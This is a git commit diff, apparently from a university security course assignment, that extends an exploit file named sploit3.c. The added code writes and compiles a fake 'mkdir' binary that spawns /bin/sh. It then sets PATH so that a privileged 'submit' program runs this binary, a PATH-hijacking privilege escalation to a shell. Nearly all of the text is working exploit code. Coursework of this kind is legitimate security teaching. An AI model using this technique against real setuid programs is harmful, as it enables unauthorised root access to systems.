3de7514ee6dc0619bb24e31d6bc4d0b55df1440a
CS458_F16_1169 <z6shang@ugster19.student.cs>
2016-10-06 11:48:05 -0400

    -

--- s3/sploit3.c
+++ s3/sploit3.c
@@ -1,11 +1,18 @@
 #include<stdio.h>
 
 int main(){
+	char prog[] = "#include<stdio.h>int main(){system(\"/bin/sh\");exit(0);}";
+	FILE *fp;
+	fp = fopen("/share/mkdir.c", "w");
+	if(fwrite((const void*)prog, sizeof(char), 55, fp) != 55){
+        return -1;	}
+	fclose(fp);
+	system("gcc /share/mkdir.c -o /share/mkdir");
 	char *argv[] = { "/usr/local/bin/submit", "-s", "env", 0 };
 	char *envp[] =
 	{
 		"HOME=/",
-		"PATH=/share/mymkdir:/bin:/usr/bin",
+		"PATH=/share:/bin:/usr/bin",
 		"TZ=UTC0",
 		"USER=beelzebub",
 		"LOGNAME=tarzan",
